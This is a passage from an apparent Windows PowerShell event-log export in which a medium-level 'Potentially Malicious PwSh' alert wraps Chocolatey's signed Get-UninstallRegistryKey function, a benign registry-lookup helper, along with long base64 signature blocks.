ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgP758QKNsTW8rWPEwFItvwYU40LERXrsVnMIx # EW0I+YIwDQYJKoZIhvcNAQEBBQAEggEAnYGeuRcmWugYjQnOQJRgsG/fTDMry1sv # PxtTaoIGjlW8iPLJk58sQdyQxEfkcsNe58bwKnvB8B0kvMol/AES2Esz4QYX/A7Z # iXdB1XxsQVio7B8XsQdGmePNEeIda18ExPkIyDnKD2grpDiFz8vaQp8CsZZcfZzc # fbM5qcUF5HFCdTI4gFxb3NXduCk7mOIhDajJH4cVpdz0N1FfVuTR+sDErHUS72vd # BQtW/gOPSA0JIetcmJrqvRXdx3n0Sp32kBxn7XyypO1L3PxBgZwW94ekQDIe5v3F # SKlmv2E38T0tU5/IUX2PNV3vMKWHs3E7Me6r6+h1TcHeXhTrRrV586GCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU2WjAjBgkqhkiG9w0BCQQxFgQUQekAipyHZj/2ib13 # V41/KGW2HqcwDQYJKoZIhvcNAQEBBQAEggEAhdsnEFLCzzvdikeGGRpCELtJtKGY # dVO1NWtm4UqWDlCg6n+aWm0/81MWDOkyzeXzYuWeBK5dU2dvLrV3vtlKJvEDJ3p3 # caImQHht9OvP7kMWRJ9YuH5j+Hh2StWpsOxKWEQjUawkin2pJSOE7oFNte8rA0zB # fL9uclSP1n20elP+4Uf3NQASJdjcLypcwkOOk0D+mWjFI0eFTxc5WY6/u4u8hLZu # XS0q7rRIBi8wQgTtZQ63WQwkgl00kUpy1SdFehmRfbq2onSw8LbJQh6ZI/Gt477b # FWOp8lN75cQHTfqF31fPr/PDP0LPeVn0XKEsemZZEqhbWTQE/Pg4S+QHeA== # SIG # End signature block","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:36.673 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,73,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2011 - 2017 RealDimensions Software, LLC # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Get-UninstallRegistryKey { <# .SYNOPSIS Retrieve registry key(s) for system-installed applications from an exact or wildcard search. .DESCRIPTION This function will attempt to retrieve a matching registry key for an already installed application, usually to be used with a chocolateyUninstall.ps1 automation script. The function also prevents `Get-ItemProperty` from failing when handling wrongly encoded registry keys. .NOTES Available in 0.9.10+. If you need to maintain compatibility with pre 0.9.10, please add the following to your nuspec (check for minimum version): ~~~xml <dependencies> <dependency id=""chocolatey-core.extension"" version=""1.1.0"" /> </dependencies> ~~~ .INPUTS String .OUTPUTS This function searches registry objects and returns an array of PSCustomObject with the matched key's properties. Retrieve properties with dot notation, for example: `$key.UninstallString` .PARAMETER SoftwareName Part or all of the Display Name as you see it in Programs and Features. It should be enough to be unique. The syntax follows the rules of the PowerShell `-like` operator, so the `*` character is interpreted as a wildcard, which matches any (zero or more) characters. If the display name contains a version number, such as ""Launchy (2.5)"", it is recommended you use a fuzzy search `""Launchy (*)""` (the wildcard `*`) so if Launchy auto-updates or is updated outside of Chocolatey, the uninstall script will not fail. Take care not to abuse fuzzy/glob pattern searches. Be conscious of programs that may have shared or common root words to prevent overmatching. For example, ""SketchUp*"" would match two keys with software names ""SketchUp 2016"" and ""SketchUp Viewer"" that are different programs released by the same company. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # Version match: Software name is ""Gpg4Win (2.3.0)"" [array]$key = Get-UninstallRegistryKey -SoftwareName ""Gpg4win (*)"" $key.UninstallString .EXAMPLE > # Fuzzy match: Software name is ""Launchy 2.5"" [array]$key = Get-UninstallRegistryKey -SoftwareName ""Launchy*"" $key.UninstallString .EXAMPLE > # Exact match: Software name in Programs and Features is ""VLC media player"" [array]$key = Get-UninstallRegistryKey -SoftwareName ""VLC media player"" $key.UninstallString .EXAMPLE > # Version match: Software name is ""SketchUp 2016"" # Note that the similar software name ""SketchUp Viewer"" would not be matched. [array]$key = Get-UninstallRegistryKey -SoftwareName ""SketchUp [0-9]*"" $key.UninstallString .LINK Install-ChocolateyPackage .LINK Install-ChocolateyInstallPackage .LINK Uninstall-ChocolateyPackage #> [CmdletBinding()] param( [parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)] [string] $softwareName, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters if ($softwareName -eq $null -or $softwareName -eq '') { throw ""$SoftwareName cannot be empty for Get-UninstallRegistryKey"" } $ErrorActionPreference = 'Stop' $local_key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' $machine_key = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*' $machine_key6432 = 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' Write-Verbose ""Retrieving all uninstall registry keys"" [array]$keys = Get-ChildItem -Path @($machine_key6432, $machine_key, $local_key) -ErrorAction SilentlyContinue Write-Debug ""Registry uninstall keys on system: $($keys.Count)"" Write-Debug ""Error handling check: `'Get-ItemProperty`' fails if a registry key is encoded incorrectly."" [int]$maxAttempts = $keys.Count for ([int]$attempt = 1; $attempt -le $maxAttempts; $attempt++) { [bool]$success = $false $keyPaths = $keys | Select-Object -ExpandProperty PSPath try { [array]$foundKey = Get-ItemProperty -Path $keyPaths -ErrorAction Stop | ? { $_.DisplayName -like $softwareName } $success = $true } catch { Write-Debug ""Found bad key."" foreach ($key in $keys){ try { Get-ItemProperty $key.PsPath > $null } catch { $badKey = $key.PsPath } } Write-Verbose ""Skipping bad key: $badKey"" [array]$keys = $keys | ? { $badKey -NotContains $_.PsPath } } if ($success) { break; } if ($attempt -ge 10) { Write-Warning ""Found 10 or more bad registry keys. Run command again with `'--verbose --debug`' for more info."" Write-Debug ""Each key searched should correspond to an installed program. It is very unlikely to have more than a few programs with incorrectly encoded keys, if any at all. This may be indicative of one or more corrupted registry branches."" } } if ($foundKey -eq $null -or $foundkey.Count -eq 0) { Write-Warning ""No registry key found based on '$softwareName'"" } Write-Debug ""Found $($foundKey.Count) uninstall registry key(s) with SoftwareName:`'$SoftwareName`'""; return $foundKey } Set-Alias Get-InstallRegistryKey Get-UninstallRegistryKey # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCBES8sHzbRLLNcJ # 9iSdROLrD1zFWyfa5gBGwaNn1wzd16CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # 